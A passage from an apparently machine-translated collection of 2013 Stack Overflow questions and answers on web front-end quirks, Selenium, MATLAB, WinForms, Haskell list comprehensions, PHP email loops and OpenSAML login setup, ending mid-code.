<select onChange="typeChanged(this.options[this.selectedIndex].value,'mytable')">
    <option value="Show1">Show1</option>
     <option value="Show2">Show2</option>
</select>
 <table id="mytable" class="Show1">
    <tr>
       <th class="cellType1">type1</th>
       <th class="cellType2">type2-a</th>
       <th class="cellType2">type2-b</th>
     </tr>
     <tr>
        <td class="cellType1"><input type="text"></input></td>
        <td class="cellType2"><input type="text"></input></td>
        <td class="cellType2"><input type="text"></input></td>
     </tr>
  </table> 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-03-20T00:57:50.793

听起来它没有重新粉刷桌子。那里有几个 IE 7 和 8 重绘和回流怪...

您可以尝试在您的 javascript 中强制重绘，也许只是通过隐藏和显示表格，例如

```
document.getElementById('myTable').style.display='none';
document.getElementById('myTable').style.display='table'; 
```

或使用类似的东西强制在整个页面上进行重排

```
document.body.className=document.body.className; 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-03-25T12:01:14.643

尝试重新绘制单元格时似乎存在问题。仅从 CSS 规则不起作用，但如果我们直接在 JavaScript 中应用显示，则单元格被正确绘制。循环遍历单元格并直接应用样式，我只需要有一个命名约定即可轻松识别单元格应该是的类。

```
 if(isEmpty(cell.className)|| cell.className == (selectedType+"_cell"))
    {    
      cell.style.display = 'table-cell'; // might be different for other IE versions
    }
    else
    {
        cell.style.display = 'none';
    } 
```

# python - Selenium：使用 Python 获取元素的坐标或尺寸

> ID：15510882
> 
> 赞同：73
> 
> 时间：2013-03-19T21:34:08.353
> 
> 标签：python, selenium

我看到有一些方法可以通过 Selenium 的各种 Java 库获取元素的屏幕位置和尺寸，例如`org.openqa.selenium.Dimension`提供.`.getSize()``org.openqa.selenium.Point``getLocation()`

有没有办法通过 Selenium Python 绑定获取元素的位置或尺寸？

* * *

## 回答 #1

> 赞同：124
> 
> 时间：2013-03-19T22:02:28.213

知道了！线索在[selenium.webdriver.remote.webelement — Selenium 3.14 文档。](https://seleniumhq.github.io/selenium/docs/api/py/webdriver_remote/selenium.webdriver.remote.webelement.html)

WebElements 具有属性`.size`和`.location`. 两者都是类型`dict`。

```
driver = webdriver.Firefox()

e = driver.find_element_by_xpath("//someXpath")

location = e.location
size = e.size
w, h = size['width'], size['height']

print(location)
print(size)
print(w, h) 
```

输出：

```
{'y': 202, 'x': 165}
{'width': 77, 'height': 22}
77 22 
```

它们还有一个名为的属性[`rect`](https://seleniumhq.github.io/selenium/docs/api/py/webdriver_remote/selenium.webdriver.remote.webelement.html#selenium.webdriver.remote.webelement.WebElement.rect)，它本身就是 a `dict`，并且包含元素的`size`and `location`。

# jquery - 淡入/淡出菜单

> ID：15510884
> 
> 赞同：0
> 
> 时间：2013-03-19T21:34:14.577
> 
> 标签：jquery, menu, fadein, fadeout

当用户将鼠标悬停在无序菜单列表上时，我正在使用以下 jQuery 代码创建淡入淡出和淡出效果。然而，我似乎无法让褪色工作。非常感激任何的帮助。

这是一个在线测试页面的链接： [http ://www.youmeusdesign.co.uk/menutest/](http://www.youmeusdesign.co.uk/menutest/)

这是jQuery代码：

```
$(function(){
    $("#menu ul li").hover(function(){
             $(this).children("ul").fadeIn(500);
       },
       function(){
             $(this).children("ul").fadeOut(500);   
    })
}) 
```

这是HTML：

```
<div id="menu">
    <ul>
        <li aria-haspopup="true"><a href="index.html"></a>
            <ul>
                <li><a href="index.html">ABOUT</a>
                    <ul class="submenu1">
                        <li class="column1" aria-haspopup="false"><a href="index.html">Approach</a></li>
                        <li class="column1" aria-haspopup="false"><a href="index.html">Team</a></li>
                    </ul>
                </li>    
                <li><a href="index.html">CASE STUDIES</a>
                    <ul class="submenu2">
                        <li class="column1" aria-haspopup="false">TITLE1</li>
                        <li class="column1" aria-haspopup="false"><a href="index.html">Project A</a></li>
                        <li class="column1" aria-haspopup="false"><a href="index.html">Project B</a></li>
                        <li class="column1" aria-haspopup="false"><a href="index.html">Project C</a></li>
                        <li class="column1" aria-haspopup="false"><a href="index.html">Project D</a></li>
                        <li class="column1" aria-haspopup="false"><a href="index.html">Project E</a></li>
                        <li class="column1" aria-haspopup="false"><a href="index.html">Project F</a></li>
                        <li class="column1" aria-haspopup="false"><a href="index.html">Project G</a></li>
                        <li class="column2 negative-margin-160" aria-haspopup="false">TITLE2</li>
                        <li class="column2" aria-haspopup="false"><a href="index.html">Project H</a></li>
                        <li class="column2" aria-haspopup="false"><a href="index.html">Project I</a></li>
                        <li class="column2" aria-haspopup="false"><a href="index.html">Project J</a></li>
                        <li class="column2" aria-haspopup="false"><a href="index.html">Project K</a></li>
                        <li class="column2" aria-haspopup="false"><a href="index.html">Project L</a></li>
                        <li class="column2" aria-haspopup="false"><a href="index.html">Project M</a></li>
                        <li class="column2" aria-haspopup="false"><a href="index.html">Project N</a></li>
                        <li class="column2" aria-haspopup="false"><a href="index.html">Project O</a></li>
                    </ul>
                </li>
                <li><a href="index.html">NEWS &amp; PRESS</a>
                    <ul class="submenu3">
                        <li class="column1" aria-haspopup="false"><a href="index.html">News</a></li>
                        <li class="column1" aria-haspopup="false"><a href="index.html">Press</a></li>
                        <li class="column1" aria-haspopup="false"><a href="index.html">Awards</a></li>
                    </ul>
                </li> 
                <li><a href="index.html">CONTACT</a>
                </li>       
            </ul>
        </li>       
    </ul>
</div> 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-19T22:16:59.453

感谢您的意见。已尝试使用 animate，它现在可以在 Chrome 和 Safari 中使用，但是当您在页面加载后第一次将鼠标悬停在菜单上时，淡入淡出似乎不起作用，您必须第二次重新悬停才能使其正常工作：

这是修改后的在线测试页面的链接：[http ://www.youmeusdesign.co.uk/menutest/](http://www.youmeusdesign.co.uk/menutest/)

这是修改后的jQuery：

```
$(function(){
    $("#menu ul li").hover(function(){
             $(this).children("ul").animate(
            {"opacity": "1"},
            500);
       },
       function(){
             $(this).children("ul").animate(
            {"opacity": "0"},
            500);   
    })
}) 
```

非常感谢。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-03-19T21:45:06.257

在 Firefox 中工作，但在 chrome 中不起作用，使用 aminate 或显示/隐藏

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-03-20T00:35:00.517

您遇到了 CSS 和 Javascript 之间的冲突。在你的 CSS 中，你有这个：

```
#menu ul ul {
    position: absolute;
    width: 545px;
    height: 270px;
    left: 0;
    top: 80px;
    display: none;
    padding-top: 20px;
    background: #CCC;
} 
```

然后，当您将鼠标悬停在其中一个 li 元素上时，您的 CSS 会执行以下操作：

```
#menu ul li:hover > ul {
    display: block;
    background-image: none;
} 
```

您的 Javascript 正在尝试淡入该元素，但为时已晚——此时，该元素已被`display: block`CSS 设置为。当你将鼠标悬停时，jQuery 会为`#menu ul li ul`元素添加一个内联样式，设置`opacity: 0`.

下次您将鼠标悬停在元素上时，即使 CSS 将元素设置为`display: block`，这些元素仍将保持隐藏，因为它们被内联为`opacity: 0`，让它们根据需要淡入。

最快的解决方法是在 CSS 中将不透明度设置为 0 `#menu ul ul`，尽管我很好奇为什么 .fadeIn() 不适合你。

# matlab - 对数组的前 m 个元素求和

> ID：15510888
> 
> 赞同：1
> 
> 时间：2013-03-19T21:34:32.933
> 
> 标签：matlab

我有一个长度为 n 的数组。是否有函数可以让我计算这个数组的前 m 个元素的部分总和（ m<=n ）？

我想到了这样的事情

```
sum(X,1:10) %returns the sum of the 10 first elements of the array 
```

但这不起作用。Sum 似乎只计算整个列、行或更高维的等价物。

编辑：我想知道是否有 matlab 函数这样做 - 我可以自己编写一个程序，但它有可能更慢并且可能会做一些奇怪的事情:)

我的功能如下所示：

```
function[sum] = partialSum(X,m)
sum = 0;
for i = 1:m
    sum = sum + X(i);
end 
```

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2013-03-19T21:36:43.750

目前还不清楚你想要什么。如果它只是第一个`m`元素的总和，那么就是这样：

```
result = sum(X(1:m)); 
```

如果您想要部分和的序列，请使用[`cumsum()`](http://www.mathworks.co.uk/help/matlab/ref/cumsum.html)而不是`sum()`.

# browser - 符号查找错误：未定义符号：UCNV_FROM_U_CALLBACK_ESCAPE_44

> ID：15510889
> 
> 赞同：0
> 
> 时间：2013-03-19T21:34:38.867
> 
> 标签：browser, webkit, icu

当我尝试使用 lib webkit 共享库运行我的项目时出现此错误

整个错误是

> 符号查找错误：./lib/libwebkit-1.0.so.2：未定义符号：UCNV_FROM_U_CALLBACK_ESCAPE_44

我只是想寻找可能导致此错误的原因，因为我在谷歌上没有找到任何有用的信息来告诉我现在有什么问题。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-22T19:38:21.637

It turn out that when I recompile my ICU library "properly" it worked again

# events - xsockets 关闭事件

> ID：15510894
> 
> 赞同：1
> 
> 时间：2013-03-19T21:34:47.717
> 
> 标签：events, iis, websocket, bind

有谁知道如何关闭 xsockets 套接字。

服务器或客户端没有 api 来显示如何关闭套接字。

有一个事件可以绑定到客户端的“关闭”，但它说“这将在服务器关闭 websocket 时被调用”

如何从客户端或服务器端关闭 websocket。

我从 xsocketcontroller 中提取了套接字对象并在其上调用了 close() 但没有运气。客户端关闭没有被调用。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-20T19:17:18.767

恐怕这在文档中并不好。会尽快修复

你有几个选择。第一个是如何关闭来自客户端的连接。但是，您还将在示例代码中看到您可以从服务器端调用 close。

1.  只需通过在您的实例上调用 close() 来终止客户端中的连接。
2.  触发/发布将断开连接的服务器端事件。这会更受控制，让你清理东西。
3.  在客户端上调用与服务器的断开连接。强行关门！

请参阅 pastebin 中的示例：

HTML：[如何从 JavaScript 关闭](http://pastebin.com/vcS3iHzA)

控制器：[如何从服务器关闭（或处理来自客户端的关闭请求）](http://pastebin.com/HEkdy9nL)

# winforms - Why are all of my labels blank on this Windows Form?

> ID：15510896
> 
> 赞同：1
> 
> 时间：2013-03-19T21:34:52.453
> 
> 标签：winforms, label

I’m trying to show and hide a pop-up when certain events occur. The pop-up is appearing and disappearing properly, but all of its labels are blank. I originally was trying to populate the labels prior to showing the form, but I’ve commented-out all of that logic. The labels are all blank, but the space is properly allocated for each label (see screenshot).

my popup control:

```
public MyPopUp()
{
    InitializeComponent();
} 
```

my separate class:

```
MyPopUp _MyPopUp;

protected override void OnLoad(IServiceProvider myServiceProvider)
{
    _MyPopUp = new MyPopUp();
}

protected override void WhenSomethingHappens() {
    _MyPopUp.Show();
}

protected override void WhenSomethingElseHappens() {
    _MyPopUp.Hide();
} 
```

Here is part of my designer.cs file. I've only copy/pasted the code from one of the labels, but the other 5 labels on the form have nearly-identical code.

```
private System.Windows.Forms.Label label1;

private void InitializeComponent()
{
    this.label1 = new System.Windows.Forms.Label();
    this.SuspendLayout();
    // 
    // label1
    // 
    this.label1.AutoSize = true;
    this.label1.Location = new System.Drawing.Point(58, 9);
    this.label1.Name = "label1";
    this.label1.Size = new System.Drawing.Size(41, 13);
    this.label1.TabIndex = 0;
    this.label1.Text = "Some Label Text"; 
    // 
    // MyPopUp
    // 
    this.Controls.Add(this.label1);
    this.FormBorderStyle = System.Windows.Forms.FormBorderStyle.FixedSingle;
    this.Name = "MyPopUp";
    this.Text = "Some Text";
    this.ResumeLayout(false);
    this.PerformLayout();
} 
```

![screenshot](../Images/c0e64598bd1be3b99b5a5de676102eb8.png)

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2014-07-06T11:52:26.100

您需要调用 Refresh() 函数来强制每个子控件使其客户区无效，即重绘。

对于您的情况：

```
protected override void WhenSomethingHappens() {
    _MyPopUp.Show();
    _MyPopUp.Refresh();
} 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2014-12-16T16:23:49.060

发生这种情况是因为您正在无模式地运行表单。

如果您愿意，您可以通过模态方式运行它来检查您的字体/背景颜色是否良好等：

```
System.Windows.Forms.Application.Run(YourFormName); 
```

然后将 DoEvent 行添加到您的无模式调用中：

```
Form2 F2 = new Form2();
F2.Show();
System.Windows.Forms.Application.DoEvents(); 
```

那应该这样做！

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-03-20T14:30:08.643

尝试在显示表单之前调用，这样表单将在主线程中创建。

```
if (this.InvokeRequired)
            this.BeginInvoke((Action)(() => //'this.' is the form
            {
                _MyPopUp.Show();
            })); 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2013-03-20T13:32:56.497

我做了一个测试，发现可以让标签文本消失。`ForeColor`如果与 相同，则标签文本会消失`BackColor`。从您的标签添加代码中，我看到您没有指定这些颜色。WinForms 控件从父控件（在本例中为窗体本身）继承了许多属性，如果它们未定义的话。这可能意味着Form 的`ForeColor`和`BackColor`是相同的，并且这会传播到标签。更改`ForeColor`表单或标签的颜色以解决此问题。

# unix - How to Find all the files that were last modified in some particular month in the folder, Lets say March

> ID：15510899
> 
> 赞同：0
> 
> 时间：2013-03-19T21:35:06.827
> 
> 标签：unix

How to find all the files that were last modified in some particular month, Lets say March.

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-03-19T21:39:42.180

```
LANG=C find -printf '%AY %Ab %p\n' | awk '$1=="2013" && $2="Mar"{$1=$2="";print}' 
```

就像之前在线程中所说的那样，`ls`它是一个交互式查看文件信息的工具。它的输出是为人类格式化的，并且会导致脚本中的错误。改为使用`find`。了解原因： http: [//mywiki.wooledge.org/ParsingLs](http://mywiki.wooledge.org/ParsingLs)

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-03-19T21:44:06.190

这是解决这个问题的一个很好的命令：

```
find . -mtime +100 -mtime -200 
```

特别是，这将找到所有修改时间超过 100 天和不到 200 天的文件。相应地修改数字！

# jquery - Ajax.BeginFrom 不刷新 IE

> ID：15510903
> 
> 赞同：0
> 
> 时间：2013-03-19T21:35:21.397
> 
> 标签：jquery, ajax, internet-explorer, asp.net-mvc-4

我在 MVC4 网站中有一个表单，使用

```
@using (Ajax.BeginForm("Action","Controller", new AjaxOptions { HttpMethod = "POST", InsertionMode = InsertionMode.Replace, UpdateTargetId = "Results", OnSuccess = "OnSuccess" }))
{
   HTML....
}
<div id="Results"></div> 
```

在同一页面中，我的脚本：

```
function OnSuccess() {
         alert("Ok");
         Do More things...
    } 
```

一切正常（Chrome，FF ...）不在 IE 中（我使用的是 IE10）。该脚本工作并显示警报，但未呈现内容。如果我点击页面然后 IE 刷新它并显示内容。

有任何想法吗？

提前致谢！

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-21T20:15:27.460

只需将插入模式更改为 InsertAfter 即可

# ios - Drawing in screen with finger in UITableView

> ID：15510905
> 
> 赞同：0
> 
> 时间：2013-03-19T21:35:27.313
> 
> 标签：ios, objective-c, uitableview, touches

I am following this excellent small tutorial about drawing on screen in the layer of a UIView (subclass). [http://spritebandits.wordpress.com/](http://spritebandits.wordpress.com/) It just works.

There is just one thing. I placed this view as subview of a UITableViewCell which, naturally, is displayed as part of a UITableView. I guess I would have the same issue when I would place it within an UIScrollView. (UITableView inherits from UIScrollView anyway)

Touches are triggered by my painting view as long as their related movement is horizontal. As soon as I move the finger kinda vertical, even partly, then the UITableView takes over and scrolls the table.

Is there any proper way of stopping the Table to taike control of the touches while the touch is actually within my view?

If it is of importance: I am using storyboard. The cell is a prototype cell with its own subclass of UITableViewCell.

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-19T22:14:09.953

我已经使用您所说的同一类“Canvas”以及在 UITableViewCell 中实现了这一点。但是我并没有使用整个单元格进行绘图，只是 UITableView 内部的一个 UIView 作为子视图。

当 UIView（我允许绘图的单元格的子视图）触发 touchesBegan 或 touchesEnded 时，我通过激活和停用 UITableView 滚动来达到整个用户体验。因此，当他们在 UIView 内触摸/移动时，他们正在绘制。当它在外面时，他们正在滚动。所以他们不能在 UIView 上滚动，因为他们会画画。

您的问题是，由于整个单元格是绘图视图，因此用户无法在此具体单元格中滚动，因为它是绘图单元格。

希望这会有所帮助。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-03-19T21:46:40.553

我对此没有答案。但基本上有一个解决方法。

您可以让用户进入绘图模式，其中 UItableviewcell 的滚动被禁用，然后

一旦用户完成绘图，您可以再次启用滚动。

在屏幕上的任何位置包含一个按钮将帮助您切换模式。

# android - 从 Activity 更新 AppWidget

> ID：15510906
> 
> 赞同：0
> 
> 时间：2013-03-19T21:35:31.390
> 
> 标签：android, android-appwidget

我正在尝试从我的活动中更新我的 AppWidget。类似于这个问题：

[以编程方式从活动/服务/接收器更新小部件](https://stackoverflow.com/questions/3455123/programmatically-update-widget-from-activity/14256988#14256988)

我正在使用 AppWidgetManager 获取 ID 并发送更新广播，但它对我不起作用。

我怀疑这是因为我的 AppWidgetProvider 位于库项目中，因此位于与我的主应用程序不同的包中。

关于如何使其工作的任何想法？我尝试了各种上下文（this、getApplication() 等），没有任何效果。（我没有得到小部件的 ID）。

谢谢。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2014-01-29T13:46:53.397

我必须在组件名称中使用应用程序的包名称和类中库中的完整类名。

# python - python函数是否可以忽略未使用的kwargs

> ID：15510908
> 
> 赞同：11
> 
> 时间：2013-03-19T21:35:33.440
> 
> 标签：python, keyword-argument

如果我有一个简单的功能：

```
def add(a, b, c):
    return a + b + c 
```

我是否有可能做到这一点，如果我提供一个未使用的 kwarg，它就会被忽略？

```
kwargs = dict(a=1, b=2, c=3, d=4)
print add(**kwargs) #prints 6 
```

* * *

## 回答 #1

> 赞同：25
> 
> 时间：2013-03-19T21:36:24.727

当然。只需添加`**kwargs`到函数签名：

```
def add(a, b, c, **kwargs):
    return a + b + c

kwargs = dict(a=1, b=2, c=3, d=4)
print add(**kwargs) 
#prints 6 
```

# php - Send batch users their usernames via email using PHP

> ID：15510912
> 
> 赞同：1
> 
> 时间：2013-03-19T21:35:51.220
> 
> 标签：php, foreach, associative-array

I am trying to write some PHP code that emails every user in my database (around 500) their usernames. I have successfully managed to pull the email addresses and usernames for each user and store them in an array. However, I cannot figure out how to email each individual user with their individual usernames. I am pretty sure I need to use a `foreach` loop to do this, but I have had no luck. Here is what I have.

```
<?php
include('databaseConn.php');

$query = mysql_query("SELECT * FROM staff");
$emailArray;

while ($row = mysql_fetch_array($query)) {
$emailArray[] = array($row['email']=>$row['username']);
}

print_r($emailArray); //This associative array now contains each username along with their respective email address.

?> 
```

==***********************=== WITH MAIL FUNCTION

```
<?php
include('functions/core.php');

$query = mysql_query("SELECT * FROM users");
$emailArray;

while ($row = mysql_fetch_array($query)) {
    $emailArray[] = array($row['email']=>$row['username']);
}

foreach($emailArray as $email => $username) {
    echo $username; // outputs the indexes.

$subject = 'Accoutn Details';

$message = 'This email contains your login details.<br/><br/>
<b>Username: '.$username.'</b><br/>
<br/><br/>Kind regards,<br/>';

$headers = 'From: noreply@xxxxx.co.uk' . "\r\n" .
    'Reply-To: noreply@xxxxx.co.uk' . "\r\n" .

$headers .= 'Content-type: text/html; charset=iso-8859-1' . "\r\n"; 

mail($emailAddress, $subject, $message, $headers);

}

//print_r($emailArray);

?> 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-19T21:41:44.123

如果您的问题是如何使用 foreach... [http://www.php.net/manual/en/control-structures.foreach.php](http://www.php.net/manual/en/control-structures.foreach.php)

例如：

```
foreach ($emailArray as $email => $username) {
    // Send an email to $email with their $username
} 
```

@Dagon 是对的，如果您不需要关联数组，则无需迭代两次。即使您确实需要一个数组，它也不一定必须是关联的；它可能是数据库中的原始行，您可以对其进行迭代。唯一*需要*关联数组的时候是当您需要通过键（电子邮件地址）查找值（用户名）时，据我所知，您不需要这样做。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-03-19T21:47:52.320

在循环中使用邮件是个坏主意，除非它是一次性的，听起来像这样，而且大多数共享主机不允许一次发送 500 封电子邮件。

```
$subject = 'Account Details';
$headers = 'From: noreply@xxxxx.co.uk' . "\r\n" .
    'Reply-To: noreply@xxxxx.co.uk' . "\r\n" .

$headers .= 'Content-type: text/html; charset=iso-8859-1' . "\r\n"; 

while ($row = mysql_fetch_array($query)) {

$message = 'This email contains your login details.<br/><br/>
<b>Username: '.$row['username'].'</b><br/>
<br/><br/>Kind regards,<br/>';

mail("$row['email']", $subject, $message, $headers);

    } 
```

# svg - JQVMap - How do I set a state color in the USA Map?

> ID：15510913
> 
> 赞同：1
> 
> 时间：2013-03-19T21:35:51.503
> 
> 标签：svg, jqvmap

My question is larger than the title. I want to apply transparency to most of the states and highlight about 6 states with a color.

The instructions on the github page are definitely written from a programmers POV. Can someone help me understand how I target individual states with CSS?

I tried, #jqvmap1_il {color:#930; background-color:#F60;} - which is targeting Illinois, but the inline CSS overrides the change.

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2013-03-20T00:09:23.613

JQVMap 的文档说你应该将一个对象传递给`colors`参数......

> 各个地图区域的颜色。颜色对象的键是符合 ISO 3166-1 alpha-2 标准的国家代码。颜色键必须小写。

这是如何完成的示例...

```
var highlighted_states = {
   il: '#f60',
   mo: '#f60',
   tx: '#f60',
   ut: '#f60',
}

jQuery('#vmap').vectorMap({
    map: 'usa_en',
    color: '#ffffff',
    colors: highlighted_states
}); 
```

# php - In CakePHP, override AppController's redirect() to respond with a url via json during ajax requests

> ID：15510914
> 
> 赞同：3
> 
> 时间：2013-03-19T21:35:55.713
> 
> 标签：php, rest, cakephp, authentication

My controller methods serve dual purpose: To both handle traditional browser requests AND to interact via REST clients using mapped resources.

Case: This is convenient because I can keep all of my validation centralized in Cake models and still have nice ajax forms that I can validate by extracting Model::validationErrors and adding them to the json response. Where I don't care if a form is ajax, I can simply NOT apply my client-side javascript and the form and server communicate normally.

Problem: Many controller actions rely on Controller::redirect(). By overriding redirect(), trying beforeRedirect(), etc, **I can find NO reliable way to convert the redirect into a JSON response during an ajax request that would indicate something like 'redirectUrl' => 'foo' so that my client (in the case of browser ajax) can forward the user to a new url using javascript location redirect.**

I thought I had it working but realized that unauthorized users had access to run protected resources despite not seeing their output.

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-29T12:34:45.740

您可以使用带有两个键的 json 数组，例如

```
$json['status'] => 'success',
$json['url'] => 'router::url ("/",array("controller" => "yourcontroller",
                  "action" => "youraction"))';
// url where you want redirect after some processing

return json_encode($json); 
```

**//在您的脚本中发送 ajax 请求：**

```
if(json['status'] == 'success'){
   window.location.href = json['url'];
} 
```

# haskell - How to have multiple infinite ranges in list comprehensions?

> ID：15510916
> 
> 赞同：6
> 
> 时间：2013-03-19T21:36:12.050
> 
> 标签：haskell

In haskell I have a list comprehension like this:

```
sq = [(x,y,z) | x <- v, y <- v, z <- v, x*x + y*y == z*z, x < y, y < z]
    where v = [1..] 
```

However when I try `take 10 sq`, it just freezes... Is there a way to handle multiple infinite ranges?

Thanks

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2013-03-20T00:47:10.547

除了解释问题的其他答案之外，这里是一个替代解决方案，可以推广使用，[`level-monad`](http://hackage.haskell.org/packages/archive/level-monad/0.3.1/doc/html/Control-Monad-Levels.html)并且[`stream-monad`](http://hackage.haskell.org/packages/archive/stream-monad/0.4.0.2/doc/html/Control-Monad-Stream.html)可以在无限搜索空间上进行搜索（它也与 list monad 和 兼容[`logict`](http://hackage.haskell.org/packages/archive/logict/0.6/doc/html/Control-Monad-Logic.html)，但这些不会很好地与无限搜索空间，正如您已经发现的那样）：

```
{-# LANGUAGE MonadComprehensions #-}

module Triples where

import Control.Monad

sq :: MonadPlus m => m (Int, Int, Int)
sq = [(x, y, z) | x <- v, y <- v, z <- v, x*x + y*y == z*z, x < y, y < z]
    where v = return 0 `mplus` v >>= (return . (1+)) 
```

现在，进行快速广度优先搜索：

```
*Triples> :m +Control.Monad.Stream
*Triples Control.Monad.Stream> take 10 $ runStream sq
[(3,4,5),(6,8,10),(5,12,13),(9,12,15),(8,15,17),(12,16,20),(7,24,25),
(15,20,25),(10,24,26),(20,21,29)] 
```

或者：

```
*Triples> :m +Control.Monad.Levels
*Triples Control.Monad.Levels> take 5 $ bfs sq   -- larger memory requirements
[(3,4,5),(6,8,10),(5,12,13),(9,12,15),(8,15,17)]
*Triples Control.Monad.Levels> take 5 $ idfs sq  -- constant space, slower, lazy
[(3,4,5),(5,12,13),(6,8,10),(7,24,25),(8,15,17)] 
```

* * *

## 回答 #2

> 赞同：5
> 
> 时间：2013-03-20T00:39:43.630

列表推导被翻译成`concatMap`函数的嵌套应用：

```
concatMap :: (a -> [b]) -> [a] -> [b]
concatMap f xs = concat (map f xs)

concat :: [[a]] -> [a]
concat [] = []
concat (xs:xss) = xs ++ concat xss

-- Shorter definition:
--
-- > concat = foldr (++) [] 
```

您的示例等效于：

```
sq = concatMap (\x -> concatMap (\y -> concatMap (\z -> test x y z) v) v) v
    where v = [1..]
          test x y z = 
              if x*x + y*y == z*z
              then if x < y
                   then if y < z
                        then [(x, y, z)]
                        else []
                   else []
              else [] 
```

这基本上是一种“嵌套循环”方法；它将首先尝试`x = 1, y = 1, z = 1`，然后继续`x = 1, y = 1, z = 2`，依此类推，直到它尝试将列表的所有元素作为 ; 的值`z`。只有这样它才能继续尝试与`y = 2`.

但是你当然可以看到问题——因为列表是无限的，我们永远不会用完可以尝试的值`z`。所以这种组合`(3, 4, 5)`只能在无数其他组合之后发生，这就是你的代码永远循环的原因。

为了解决这个问题，我们需要以更智能的方式生成三元组，这样对于任何可能的组合，生成器都会在一定数量的步骤之后到达它。研究这段代码（它只处理对，而不是三元组）：

```
-- | Take the Cartesian product of two lists, but in an order that guarantees
-- that all combinations will be tried even if one or both of the lists is 
-- infinite:
cartesian :: [a] -> [b] -> [(a, b)]
cartesian [] _ = []
cartesian _ [] = []
cartesian (x:xs) (y:ys) = 
    [(x, y)] ++ interleave3 vertical horizontal diagonal
        where 
          -- The trick is to split the problem into these four pieces:
          --
          -- |(x0,y0)| (x0,y1) ... horiz
          -- +-------+------------
          -- |(x1,y0)| .
          -- |   .   |  .
          -- |   .   |   .
          -- |   .   |    . 
          --   vert         diag
          vertical = map (\x -> (x,y)) xs
          horizontal = map (\y -> (x,y)) ys
          diagonal = cartesian xs ys

interleave3 :: [a] -> [a] -> [a] -> [a]
interleave3 xs ys zs = interleave xs (interleave ys zs)

interleave :: [a] -> [a] -> [a]
interleave xs [] = xs
interleave [] ys = ys
interleave (x:xs) (y:ys) = x : y : interleave xs ys 
```

要理解这段代码（如果我搞砸了就修复它！）查看[这篇关于如何计算无限集的博客条目](http://duartes.org/gustavo/blog/post/counting-infinity)，尤其是第四张图——该函数是基于“之字形”的算法！

我只是尝试了一个简单版本的`sq`使用它；它`(3,4,5)`几乎可以立即找到，但是需要很长时间才能找到任何其他组合（至少在 GHCI 中）。但我认为从中吸取的关键教训是：

1.  列表推导不适用于嵌套的无限列表。
2.  不要花太多时间玩列表推导。他们可以做的所有事情，类似的功能`map`，`filter`以及可以做的事情——加上[列表库](http://www.haskell.org/ghc/docs/latest/html/libraries/base/Data-List.html)`concatMap`中还有许多其他有用的功能，所以集中精力。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2013-03-19T22:04:06.240

您的代码冻结，因为您的谓词永远不会得到满足。
为什么 ？

让我们举一个没有任何谓词的例子来理解。

```
>>> let v = [1..] in take 10 $ [ (x, y, z) | x <- v,  y <- v, z <- v ] 
[(1,1,1),(1,1,2),(1,1,3),(1,1,4),(1,1,5),(1,1,6),(1,1,7),(1,1,8),(1,1,9),(1,1,10)] 
```

如您所见，x 和 y 将始终被评估为 1，因为 z 永远不会停止上升。
那么你的谓词不可能。

任何解决方法？

尝试“嵌套列表”理解。

```
>>> [[ fun x y | x <- rangeX, predXY] | y  <- rangeY, predY ] 
```

或可以使用激活的并行列表理解，

```
>>> :set -XParallelListComp 
```

[在文档](http://www.haskell.org/ghc/docs/latest/html/users_guide/syntax-extns.html#parallel-list-comprehensions)上查找

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2013-03-19T21:40:16.883

这是可能的，但您必须提出生成数字的顺序。以下生成您想要的数字；请注意，可以通过仅生成is和类似 for （确定一次并绑定）`x < y`来替换测试：`y``>x``z``x``y`

```
[(x, y, z) | total <- [1..]
           , x <- [1..total-2]
           , y <- [x..total-1]
           , z <- [total - x - y]
           , x*x + y*y == z*z] 
```

# java - How do I send the user to a SAML login page using OpenSAML?

> ID：15510917
> 
> 赞同：1
> 
> 时间：2013-03-19T21:36:13.030
> 
> 标签：java, authentication, saml, opensaml

I have an app that already has a login system and user objects, etc. I want to adapt it so it can authenticate using a SAML identity provider.

To do so I need to construct a page that sends the user to the identity provider to login. Here is what I've come up with so far to test with:

```
public String getSamlLoginPage() throws IOException, ConfigurationException {
    DefaultBootstrap.bootstrap();

    AuthnRequest authnRequest = buildSamlObject(AuthnRequest.DEFAULT_ELEMENT_NAME,AuthnRequestBuilder.class);

    String myResponseUrl = "http://localhost:8080/samltest/saml?action=samlLogin";
    String serviceProviderEntityId = "someProviderEntityId";

    // set information in request
    {
        authnRequest.setForceAuthn(false);
        authnRequest.setIsPassive(false);
        authnRequest.setIssueInstant(new DateTime());
        authnRequest.setDestination(myResponseUrl);
        authnRequest.setProtocolBinding(SAMLConstants.SAML2_ARTIFACT_BINDING_URI);
        authnRequest.setAssertionConsumerServiceURL(myResponseUrl);
        authnRequest.setID(""+UUID.randomUUID().getLeastSignificantBits());

        Issuer issuer = buildSamlObject(Issuer.DEFAULT_ELEMENT_NAME, IssuerBuilder.class);
        issuer.setValue(serviceProviderEntityId);
        authnRequest.setIssuer(issuer);

        NameIDPolicy nameIDPolicy = buildSamlObject(NameIDPolicy.DEFAULT_ELEMENT_NAME, NameIDPolicyBuilder.class);
        nameIDPolicy.setSPNameQualifier(serviceProviderEntityId);
        nameIDPolicy.setAllowCreate(true);
